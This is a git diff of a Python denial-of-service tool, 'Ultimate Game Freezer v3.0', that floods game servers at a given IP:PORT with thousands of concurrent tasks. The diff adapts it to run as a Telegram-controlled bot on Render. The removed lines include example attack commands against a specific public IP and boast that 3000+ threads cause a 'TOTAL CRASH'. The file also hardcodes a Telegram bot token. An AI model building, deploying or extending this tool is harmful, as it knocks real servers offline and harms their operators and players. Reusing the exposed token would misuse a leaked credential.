@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
 ULTIMATE GAME FREEZER v3.0 — TELEGRAM INTEGRATED
-Render-compatible version with health check
+Render-optimized: No input() prompts, health server included.
 """
 
 import asyncio
@@ -15,8 +15,6 @@ import threading
 
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
-
-os.system('clear')
 
 # ─── CONFIG ───────────────────────────────────────────────────────────────────
 BOT_TOKEN = "8824657166:AAF_emEYxOjlMwMw8MEixEpq6rQzWFFyLUg"
@@ -39,15 +37,15 @@ active_attacks = {}
 # ─── BANNER ──────────────────────────────────────────────────────────────────
 
 def banner():
-    os.system('clear')
     print("""
-\033[91m╦ ╦┌─┐┌┐┌┬ ┬┌┬┐┌─┐┌─┐┌┬┐\033[0m
-\033[91m║║║├┤ │││├─┤ │ ├┤ └─┐ │ \033[0m
-\033[91m╚╩╝└─┘┘└┘┴ ┴ ┴ └─┘└─┘ ┴ \033[0m
-\033[93m         v3.0 ULTIMATE 💀❄️\033[0m
-    """)
-    print("\033[92mMAKE BY SAMIT | TERMUX POWER\033[0m")
-    print("\033[96m═" * 60 + "\033[0m\n")
+╦ ╦┌─┐┌┐┌┬ ┬┌┬┐┌─┐┌─┐┌┬┐
+║║║├┤ │││├─┤ │ ├┤ └─┐ │ 
+╚╩╝└─┘┘└┘┴ ┴ ┴ └─┘└─┘ ┴ 
+         v3.0 ULTIMATE 💀❄️
+    
+MAKE BY SAMIT | TERMUX POWER
+════════════════════════════════════════════════════════════
+""")
 
 # ─── CORE ATTACK ENGINE (ORIGINAL - UNCHANGED) ──────────────────────────────
 
@@ -77,79 +75,28 @@ async def real_freezer(target, threads=3000, duration=300):
         ip, port = target.split(':')
         port = int(port)
     except:
-        print("\033[91m❌ INVALID FORMAT: Use IP:PORT\033[0m")
+        print("INVALID FORMAT: Use IP:PORT")
         return
 
-    banner()
-    print(f"\033[91m💀 ULTIMATE GAME FREEZER ACTIVATED\033[0m")
-    print(f"\033[93m🎯 TARGET: \033[92m{target}\033[0m")
-    print(f"\033[93m⏱️ DURATION: \033[92m{duration}s\033[0m")
-    print(f"\033[93m⚡ THREADS: \033[92m{threads:,}\033[0m")
-    print(f"\033[96m═══════════════════════════════════════════════\033[0m")
+    print(f"ULTIMATE GAME FREEZER ACTIVATED")
+    print(f"TARGET: {target}")
+    print(f"DURATION: {duration}s")
+    print(f"THREADS: {threads:,}")
 
     payloads = GAME_PAYLOADS * 5
     tasks = []
 
-    print(f"\033[92m🚀 LAUNCHING {threads:,} MISSILES...\033[0m")
     for i in range(threads):
         payload = payloads[i % len(payloads)]
         task = asyncio.create_task(ultimate_killer(ip, port, duration, payload))
         tasks.append(task)
-        if i % 500 == 0:
-            print(f"\033[92m[{i:,}/{threads:,}] LOADING...\033[0m", end='\r')
 
-    print(f"\n\033[91m💥 ATTACK IN PROGRESS... CTRL+C TO STOP\033[0m")
+    print("ATTACK IN PROGRESS...")
     await asyncio.gather(*tasks, return_exceptions=True)
 
-    banner()
-    print(f"\033[92m✅ MISSION COMPLETE!\033[0m")
-    print(f"\033[93m🎯 TARGET FROZEN: \033[92m{target}\033[0m")
-    print(f"\033[93m⏱️ TIME ELAPSED: \033[92m{duration}s\033[0m")
-    print(f"\033[96m═══════════════════════════════════════════════\033[0m")
-
-def print_menu():
-    banner()
-    print("\033[92m📱 ULTIMATE COMMANDS:\033[0m")
-    print("\033[96m1. Interactive Mode ────── python3 freezer.py\033[0m")
-    print("\033[96m2. Quick Freeze ──────── python3 freezer.py --freeze IP:PORT --duration 300\033[0m")
-    print("\033[96m3. Mega Attack ──────── python3 freezer.py --attack IP:PORT --duration 600\033[0m\n")
-
-    print("\033[93m🎮 GAME SERVER EXAMPLES:\033[0m")
-    print("\033[92mpython3 freezer.py --freeze 15.206.194.9:7380 --duration 300\033[0m")
-    print("\033[92mpython3 freezer.py --freeze 15.206.194.9:25565 --duration 600\033[0m\n")
-
-    print("\033[91m⚡ POWER LEVELS:\033[0m")
-    print("   500 threads  = LAG 😴")
-    print("  2000 threads  = HEAVY FREEZE 🐌")
-    print(" 3000+ threads  = TOTAL CRASH 💀❄️\n")
-
-    print("\033[96mPress Enter for Interactive Mode...\033[0m")
-    input()
-
-async def interactive_mode():
-    while True:
-        banner()
-        print("\033[92m🎮 INTERACTIVE FREEZER\033[0m")
-        print("\033[96mFormat: IP:PORT [seconds]  (default 300s)\033[0m")
-        print("\033[96mType 'menu' or 'quit'\033[0m")
-
-        target_input = input("\n\033[93m💀 Target>\033[0m ").strip()
-
-        if target_input.lower() in ['quit', 'menu']:
-            if target_input.lower() == 'menu':
-                print_menu()
-            break
-
-        try:
-            parts = target_input.split()
-            target = parts[0]
-            duration = int(parts[1]) if len(parts) > 1 else 300
-
-            await real_freezer(target, 3000, duration)
-            input("\n\033[93mPress Enter for next target...\033[0m")
-        except:
-            print("\033[91m❌ Error! Format: IP:PORT 300\033[0m")
-            input("\033[93mPress Enter...\033[0m")
+    print("MISSION COMPLETE!")
+    print(f"TARGET FROZEN: {target}")
+    print(f"TIME ELAPSED: {duration}s")
 
 # ─── TELEGRAM BOT HANDLERS ────────────────────────────────────────────────
 
@@ -306,7 +253,7 @@ def run_health_server():
             self.wfile.write(b"ULTIMATE GAME FREEZER BOT RUNNING")
         
         def log_message(self, format, *args):
-            pass  # Suppress logs
+            pass
     
     with socketserver.TCPServer(("", PORT), HealthHandler) as httpd:
         print(f"✅ Health server running on port {PORT}")
@@ -331,8 +278,7 @@ def start_bot():
     app.add_handler(CommandHandler("status", status_cmd))
     app.add_handler(CallbackQueryHandler(button_handler))
     
-    print("✅ Bot running! Press Ctrl+C to stop.")
-    print("📱 Check Telegram — you'll receive an online notification.")
+    print("✅ Bot running on Render! Press Ctrl+C to stop.")
     app.run_polling(allowed_updates=Update.ALL_TYPES)
 
 # ─── CLI MAIN ────────────────────────────────────────────────────────────
@@ -348,6 +294,7 @@ def main():
     try:
         args = parser.parse_args()
         if args.telegram:
+            # DIRECTLY START BOT — NO INPUT() CALLS
             start_bot()
             return
         if args.freeze or args.attack:
@@ -357,8 +304,8 @@ def main():
     except:
         pass
 
-    print_menu()
-    asyncio.run(interactive_mode())
+    # Interactive mode (only runs locally, not on Render with --telegram)
+    print("Use --telegram for bot mode or --freeze IP:PORT for direct attack")
 
 if __name__ == '__main__':
     main()
